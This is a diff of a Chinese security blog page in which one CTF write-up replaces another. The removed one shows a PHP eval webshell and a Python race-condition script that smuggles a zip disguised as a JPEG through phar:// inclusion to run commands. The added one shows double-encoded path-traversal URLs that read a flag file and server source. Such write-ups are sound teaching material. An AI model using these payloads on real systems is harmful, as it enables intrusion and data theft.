@@ -89,20 +89,21 @@
 
 
 
-<meta name="description" content="文件上传、php伪协议、文件包含">
+<meta name="description" content="CSAW CTF 2017-Orange v1-writeup文件读取漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XMAX夏令营-2017-babyweb-writeup">
-<meta property="og:url" content="http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/index.html">
+<meta property="og:title" content="CSAW CTF 2017-Orange v1-writeup">
+<meta property="og:url" content="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="文件上传、php伪协议、文件包含">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/1.png?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/2.png?raw=true">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/3.png?raw=true">
-<meta property="og:updated_time" content="2017-08-22T09:07:10.595Z">
+<meta property="og:description" content="CSAW CTF 2017-Orange v1-writeup文件读取漏洞">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/1.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/2.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/3.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/4.png?raw=true">
+<meta property="og:updated_time" content="2017-09-19T13:59:50.145Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XMAX夏令营-2017-babyweb-writeup">
-<meta name="twitter:description" content="文件上传、php伪协议、文件包含">
-<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/1.png?raw=true">
+<meta name="twitter:title" content="CSAW CTF 2017-Orange v1-writeup">
+<meta name="twitter:description" content="CSAW CTF 2017-Orange v1-writeup文件读取漏洞">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/1.png?raw=true">
 
 
 
@@ -130,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/"/>
+  <link rel="canonical" href="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/"/>
 
 
 
 
 
-  <title> XMAX夏令营-2017-babyweb-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> CSAW CTF 2017-Orange v1-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -302,7 +303,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/">
+  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -326,7 +327,7 @@
             
             
               
-                XMAX夏令营-2017-babyweb-writeup
+                CSAW CTF 2017-Orange v1-writeup
               
             
           </h1>
@@ -341,8 +342,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-22T13:37:42+08:00">
-                2017-08-22
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-18T13:46:28+08:00">
+                2017-09-18
               </time>
             
 
@@ -383,7 +384,7 @@
 
           
           
-             <span id="/2017/08/22/XMAX夏令营-2017-babyweb-writeup/" class="leancloud_visitors" data-flag-title="XMAX夏令营-2017-babyweb-writeup">
+             <span id="/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/" class="leancloud_visitors" data-flag-title="CSAW CTF 2017-Orange v1-writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -410,29 +411,18 @@
       
 
       
-        <p>文件上传、php伪协议、文件包含<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199</div></pre></td></tr></table></figure></p>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>一个图片上传功能（submit），还有一个图片查看功能（view）。点击后可发现url是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=submit</div><div class="line">http://202.112.51.217:8199/index.php?page=view</div></pre></td></tr></table></figure></p>
-<p>在submit处有上传功能，对应的页面是upload.php。</p>
-<p>猜测有包含漏洞，用php伪协议读取源码，其余类似：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure></p>
-<p>upload.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$error=$_FILES[<span class="string">'pic'</span>][<span class="string">'error'</span>];</div><div class="line">$tmpName=$_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">$name=$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>];</div><div class="line">$size=$_FILES[<span class="string">'pic'</span>][<span class="string">'size'</span>];</div><div class="line">$type=$_FILES[<span class="string">'pic'</span>][<span class="string">'type'</span>];</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">	<span class="keyword">if</span>($name!==<span class="string">""</span>)</div><div class="line">	&#123;</div><div class="line">		$name1=substr($name,<span class="number">-4</span>);</div><div class="line">		<span class="keyword">if</span>(($name1!==<span class="string">".gif"</span>) <span class="keyword">and</span> ($name1!==<span class="string">".jpg"</span>))</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"hehe"</span>;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"</span>;</div><div class="line">			<span class="keyword">exit</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>($type!==<span class="string">"image/jpeg"</span>&amp;&amp;$type!==<span class="string">"image/gif"</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">//echo mime_content_type($tmpName);</span></div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"</span>;</div><div class="line">			<span class="keyword">exit</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(is_uploaded_file($tmpName))&#123;</div><div class="line">			$time=time();</div><div class="line">			$rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">			<span class="keyword">if</span>(!move_uploaded_file($tmpName,$rootpath))&#123;</div><div class="line">				<span class="keyword">echo</span> <span class="string">"&lt;script language='JavaScript'&gt;alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script&gt;"</span>;</div><div class="line">				<span class="keyword">exit</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span>&#123;</div><div class="line">				sleep(<span class="number">2</span>);				</div><div class="line">				<span class="keyword">if</span> ($type==<span class="string">'image/jpeg'</span>)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromjpeg($rootpath);</div><div class="line">					<span class="keyword">if</span>(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(<span class="number">150</span>, <span class="number">30</span>);</div><div class="line">					  $bg = imagecolorallocate($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">					  $text_color = imagecolorallocate($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					  imagefilledrectangle($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">150</span>, <span class="number">30</span>, $bg);</div><div class="line">					  imagestring($im, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="string">"Error loading image"</span>, $text_color);</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">						imagejpeg($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">else</span> <span class="keyword">if</span> ($type==<span class="string">'image/gif'</span>)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromgif($rootpath);</div><div class="line">					<span class="keyword">if</span>(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(<span class="number">150</span>, <span class="number">30</span>);</div><div class="line">					  $bg = imagecolorallocate($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">					  $text_color = imagecolorallocate($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					  imagefilledrectangle($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">150</span>, <span class="number">30</span>, $bg);</div><div class="line">					  imagestring($im, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="string">"Error loading image"</span>, $text_color);</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">						imagegif($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				unlink($rootpath);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"图片ID："</span>.$time;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"ERROR"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>index.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require</span>(<span class="string">"header.php"</span>);</div><div class="line">	$page=<span class="string">""</span>;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</div><div class="line">	&#123;</div><div class="line">		$page=strtolower($_GET[<span class="string">'page'</span>]);</div><div class="line">		$page=str_replace(<span class="string">"#"</span>, <span class="string">""</span>, $page);</div><div class="line">		$page=str_replace(<span class="string">"'"</span>, <span class="string">""</span>, $page);</div><div class="line">		$page=$page.<span class="string">".php"</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		$page=<span class="string">"main.php"</span>;</div><div class="line">	<span class="keyword">include</span>($page);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>在upload.php中，它先将我们上传的文件保存到uploads文件夹下，然后sleep(2)，接着调用imagecreatefromgif等一系列操作。如果我们上传一个包含php代码的图片木马，在经过imagecreatefromgif等一系列操作后，正常情况下其中的php代码会被去掉，也就是说操作过后的图片已经不是图片木马了。不过由于存在sleep(2)，可以利用这个两秒的空隙，利用phar或者zip协议去包含我们上传的还未被删除的图片木马。</p>
-<p>基本的流程如下。<br>首先有个k.php，内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php @eval($_POST[&apos;test&apos;]) ?&gt;</div></pre></td></tr></table></figure></p>
-<p>将它压缩为zip文件，文件名为k.zip。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/1.png?raw=true" alt=""></p>
-<p>然后上传时将其文件名改为k.jpg，类型改为image/jpeg。在上传后访问<code>http://202.112.51.217:8199/uploads/</code>，去获取最新的文件名，然后用协议去包含。如果手动的话时间肯定会超过2s，所以需要用脚本。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.session()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadfile</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">'http://202.112.51.217:8199/upload.php'</span></div><div class="line">    data = &#123;<span class="string">'title'</span>:<span class="string">'1'</span>,<span class="string">'url'</span>:<span class="string">'1'</span>&#125;</div><div class="line">    files = &#123;<span class="string">'pic'</span>: (<span class="string">'k.jpg'</span>, open(<span class="string">'k.zip'</span>, <span class="string">'rb'</span>), <span class="string">'image/jpeg'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</div><div class="line">    html = s.post(url,files=files)</div><div class="line"></div><div class="line">// get the latest filename</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilename</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">'http://202.112.51.217:8199/uploads/'</span></div><div class="line">    content = s.get(url).content</div><div class="line">    reg = <span class="string">r'href="(.+?\.jpg)"'</span></div><div class="line">    imgre = re.compile(reg)</div><div class="line">    imglist = re.findall(imgre,content)</div><div class="line">    <span class="keyword">return</span> imglist[::<span class="number">-1</span>]      </div><div class="line"></div><div class="line">// use phar getshell</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></div><div class="line">	filename = getfilename()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> filename:</div><div class="line">	    url = <span class="string">'http://202.112.51.217:8199/index.php?page=phar://uploads/'</span> + i +<span class="string">'/k'</span></div><div class="line">	    data = &#123;<span class="string">'test'</span>:<span class="string">'system("ls");'</span>&#125;</div><div class="line">	    content = s.post(url,data=data).content</div><div class="line">	    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> content:</div><div class="line">	        <span class="keyword">print</span> content</div><div class="line">	        exit()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    t1 = threading.Thread(target=uploadfile)</div><div class="line">    t2 = threading.Thread(target=getshell)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/2.png?raw=true" alt=""></p>
-<p>之后将getshell里的改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">data = &#123;&apos;test&apos;:&apos;system(&quot;cat xxxxxxxxxasdasf_flag.php&quot;);&apos;&#125;</div><div class="line">content = s.post(url,data=data).content</div><div class="line">if &apos;&#123;&apos; in content:</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/3.png?raw=true" alt=""></p>
-<p>因为index.php中对<code>#</code>进行了过滤，所以zip协议用不了。因为zip协议的利用要如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=phar://uploads/filename.jpg#k</div></pre></td></tr></table></figure></p>
-<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
-<li><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="external">zip或phar协议包含文件</a></li>
-<li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></li>
-<li><a href="http://4o4notfound.org/index.php/archives/31/" target="_blank" rel="external">PHP伪协议分析与应用</a></li>
-<li><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external">挖洞姿势：特殊的上传技巧，绕过PHP图片转换实现远程代码执行（RCE） </a></li>
-</ul>
+        <p>CSAW CTF 2017-Orange v1-writeup<br>文件读取漏洞<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">I wrote a little proxy program in NodeJS for my poems folder.</div><div class="line">Everyone wants to read flag.txt but I like it too much to share.</div><div class="line">http://web.chal.csaw.io:7311/?path=orange.txt</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>若将path参数放空，即 <a href="http://web.chal.csaw.io:7311/?path=" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/1.png?raw=true" alt=""></p>
+<p>没有flag.txt，所以需要想办法“遍历”一下目录。</p>
+<p>尝试访问: <a href="http://web.chal.csaw.io:7311/?path=../" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=../</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/2.png?raw=true" alt=""></p>
+<p>考虑到可能有二次编码的问题，<code>.</code> =&gt; <code>%2e</code> =&gt; <code>%252e</code>，访问：<a href="http://web.chal.csaw.io:7311/?path=%252e%252e/" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=%252e%252e/</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/3.png?raw=true" alt=""></p>
+<p>最后访问:　<a href="http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/4.png?raw=true" alt=""></p>
+<p>读取到一些源文件，如下：</p>
+<p>back.py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> SimpleHTTPServer</div><div class="line"><span class="keyword">import</span> SocketServer</div><div class="line"></div><div class="line">PORT = <span class="number">8080</span></div><div class="line"></div><div class="line">Handler = SimpleHTTPServer.SimpleHTTPRequestHandler</div><div class="line"></div><div class="line">httpd = SocketServer.TCPServer((<span class="string">""</span>, PORT), Handler)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Serving at port"</span>, PORT</div><div class="line">httpd.serve_forever()</div></pre></td></tr></table></figure></p>
+<p>serve.sh:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/env bash</span></div><div class="line"></div><div class="line">python back.py &amp;</div><div class="line">nodejs server.js</div></pre></td></tr></table></figure></p>
+<p>server.js:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> path = url.parse(req.url, <span class="literal">true</span>).query;</div><div class="line">        path = path[<span class="string">'path'</span>];</div><div class="line">        <span class="keyword">if</span> (path.indexOf(<span class="string">".."</span>) == <span class="number">-1</span> &amp;&amp; path.indexOf(<span class="string">"ＮＮ"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">            <span class="keyword">var</span> base = <span class="string">"http://localhost:8080/poems/"</span>;</div><div class="line">            <span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line">                <span class="keyword">var</span> str = <span class="string">''</span>;</div><div class="line">                response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">                    str += chunk;</div><div class="line">                &#125;);</div><div class="line">                response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                  res.end(str);</div><div class="line">                &#125;);</div><div class="line">            &#125;</div><div class="line">            http.get(base + path, callback).end();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            res.writeHead(<span class="number">403</span>);</div><div class="line">            res.end(<span class="string">"WHOA THATS BANNED!!!!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (e) &#123;</div><div class="line">        res.writeHead(<span class="number">404</span>);</div><div class="line">        res.end(<span class="string">'Oops'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line">server.listen(<span class="number">9999</span>);</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -445,12 +435,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2017/08/22/XMAX夏令营-2017-babyweb-writeup/">XMAX夏令营-2017-babyweb-writeup</a></p>
+  <p><span>本文标题:</span><a href="/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/">CSAW CTF 2017-Orange v1-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
-  <p><span>发布时间:</span>2017年08月22日 - 13:08</p>
-  <p><span>最后更新:</span>2017年08月22日 - 17:08</p>
-  <p><span>原始链接:</span><a href="/2017/08/22/XMAX夏令营-2017-babyweb-writeup/" title="XMAX夏令营-2017-babyweb-writeup">http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2017年09月18日 - 13:09</p>
+  <p><span>最后更新:</span>2017年09月19日 - 21:09</p>
+  <p><span>原始链接:</span><a href="/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/" title="CSAW CTF 2017-Orange v1-writeup">http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -520,8 +510,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/19/Software-Security-Learning/" rel="next" title="Software-Security-Learning">
-                <i class="fa fa-chevron-left"></i> Software-Security-Learning
+              <a href="/2017/09/16/问鼎杯-CTF-writeup/" rel="next" title="问鼎杯 CTF writeup">
+                <i class="fa fa-chevron-left"></i> 问鼎杯 CTF writeup
               </a>
             
           </div>
@@ -530,8 +520,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/08/22/XMAX夏令营-2017-比赛系统-writeup/" rel="prev" title="XMAX夏令营-2017-比赛系统-writeup">
-                XMAX夏令营-2017-比赛系统-writeup <i class="fa fa-chevron-right"></i>
+              <a href="/2017/09/18/CSAW-CTF-2017-Shia-Labeouf-off-writeup/" rel="prev" title="CSAW CTF 2017-Shia Labeouf-off-writeup">
+                CSAW CTF 2017-Shia Labeouf-off-writeup <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -604,7 +594,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">95</span>
+                <span class="site-state-item-count">132</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -622,7 +612,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">45</span>
+                <span class="site-state-item-count">53</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -710,7 +700,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task"><span class="nav-number">1.</span> <span class="nav-text">Task</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refference"><span class="nav-number">3.</span> <span class="nav-text">Refference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task"><span class="nav-number">1.</span> <span class="nav-text">Task</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li></ol></div>
             
 
           </div>
